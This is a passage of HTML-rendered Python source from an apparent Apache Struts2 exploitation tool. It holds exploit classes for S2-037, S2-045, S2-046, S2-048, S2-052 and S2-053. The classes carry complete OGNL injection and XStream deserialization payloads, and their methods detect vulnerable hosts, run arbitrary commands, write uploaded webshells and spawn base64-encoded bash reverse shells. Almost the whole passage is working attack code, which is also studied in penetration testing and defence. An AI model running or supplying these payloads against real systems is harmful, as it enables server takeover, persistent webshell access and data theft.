url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> url.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            self.url = url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.url = url + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-037&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_045</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-045漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span></span><br><span class="line">    web_path = <span class="string">r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(&quot;/&quot;))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span></span><br><span class="line">    exec_payload = <span class="string">r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;CMD&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span></span><br><span class="line">    upload_payload = <span class="string">r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(&quot;f&quot;)),#fos.write(#req.getParameter(&quot;t&quot;).getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(&quot;OK&quot;),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))&#125;&quot;&quot;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.data = data</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-045&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = self.web_path</span><br><span class="line">        html = post(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = self.exec_payload.replace(<span class="string">&#x27;CMD&#x27;</span>, cmd)</span><br><span class="line">        html = post_stream(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = <span class="string">&quot;?t=&#123;shell&#125;&amp;f=&#123;path&#125;&quot;</span>.<span class="built_in">format</span>(shell=quote(shell), path=upload_path)</span><br><span class="line">        self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = self.upload_payload</span><br><span class="line">        html = post(self.url + data, self.data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_046</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-046漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;))).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;security_&#x27;)).(#res.getWriter().print(&#x27;check&#x27;)).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;CMD&#x27;.toString().split(&#x27;\\\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\\\AAAA&#x27;)).(#str=#s.hasNext()?#s.next():&#x27;&#x27;).(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())&#125;\0b&quot;</span></span><br><span class="line">    upload_paylaod = <span class="string">&quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#filecontent=&#x27;SHELL&#x27;).(new java.io.BufferedWriter(new java.io.FileWriter(&#x27;PATH&#x27;)).append(new java.net.URLDecoder().decode(#filecontent,&#x27;ENCODING&#x27;)).close()).(#res.getWriter().print(&#x27;O&#x27;)).(#res.getWriter().print(&#x27;K&#x27;)).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        files = &#123;<span class="string">&#x27;test&#x27;</span>: (self.check_poc.replace(<span class="string">&#x27;ENCODING&#x27;</span>, self.encoding), <span class="string">b&#x27;x&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> html == <span class="string">&#x27;security_check&#x27;</span>:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-046&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        files = &#123;<span class="string">&#x27;test&#x27;</span>: (self.web_path.replace(<span class="string">&#x27;ENCODING&#x27;</span>, self.encoding), <span class="string">b&#x27;x&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        paylaod = self.exec_payload.replace(<span class="string">&#x27;CMD&#x27;</span>, cmd).replace(<span class="string">&#x27;ENCODING&#x27;</span>, self.encoding)</span><br><span class="line">        html = post_file(self.url, paylaod, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        files = &#123;<span class="string">&#x27;test&#x27;</span>: (</span><br><span class="line">            self.upload_paylaod.replace(<span class="string">&#x27;SHELL&#x27;</span>, quote(shell)).replace(<span class="string">&#x27;PATH&#x27;</span>, upload_path).replace(<span class="string">&#x27;ENCODING&#x27;</span>,</span><br><span class="line">                                                                                                    self.encoding),</span><br><span class="line">            <span class="string">b&#x27;x&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_048</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-048漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())).(%23q)%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;username=test&amp;password=&#123;exp&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        num1 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        poc = self.check_poc.<span class="built_in">format</span>(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = <span class="built_in">str</span>(num1 + num2)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> nn <span class="keyword">in</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-048&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_052</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-052漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-052:影响版本Struts 2.1.2-2.3.33,2.5-2.5.12; POST请求发送数据,不需要参数; 支持任意命令执行(无回显)和反弹shell,不支持检测该漏洞是否存在&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;&quot;&quot;&lt;map&gt;</span></span><br><span class="line"><span class="string">  &lt;entry&gt;</span></span><br><span class="line"><span class="string">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">      &lt;flags&gt;0&lt;/flags&gt;</span></span><br><span class="line"><span class="string">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;initialized&gt;false&lt;/initialized&gt;</span></span><br><span class="line"><span class="string">                &lt;opmode&gt;0&lt;/opmode&gt;</span></span><br><span class="line"><span class="string">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                      &lt;command&gt;</span></span><br><span class="line"><span class="string">                        &#123;cmd&#125;</span></span><br><span class="line"><span class="string">                      &lt;/command&gt;</span></span><br><span class="line"><span class="string">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                    &lt;/next&gt;</span></span><br><span class="line"><span class="string">                  &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;method&gt;</span></span><br><span class="line"><span class="string">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                      &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                      &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                    &lt;/method&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                  &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">                &lt;lock/&gt;</span></span><br><span class="line"><span class="string">              &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">              &lt;done&gt;false&lt;/done&gt;</span></span><br><span class="line"><span class="string">              &lt;ostart&gt;0&lt;/ostart&gt;</span></span><br><span class="line"><span class="string">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span></span><br><span class="line"><span class="string">              &lt;closed&gt;false&lt;/closed&gt;</span></span><br><span class="line"><span class="string">            &lt;/is&gt;</span></span><br><span class="line"><span class="string">            &lt;consumed&gt;false&lt;/consumed&gt;</span></span><br><span class="line"><span class="string">          &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">          &lt;transferFlavors/&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span></span><br><span class="line"><span class="string">      &lt;/value&gt;</span></span><br><span class="line"><span class="string">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span></span><br><span class="line"><span class="string">  &lt;/entry&gt;</span></span><br><span class="line"><span class="string">  &lt;entry&gt;</span></span><br><span class="line"><span class="string">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span></span><br><span class="line"><span class="string">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span></span><br><span class="line"><span class="string">  &lt;/entry&gt;</span></span><br><span class="line"><span class="string">&lt;/map&gt;&quot;&quot;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        cmd = parse_cmd(cmd, <span class="built_in">type</span>=<span class="string">&#x27;xml&#x27;</span>)</span><br><span class="line">        data = self.exec_payload.<span class="built_in">format</span>(cmd=cmd)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_053</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-053漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span></span><br><span class="line">    exec_payload = <span 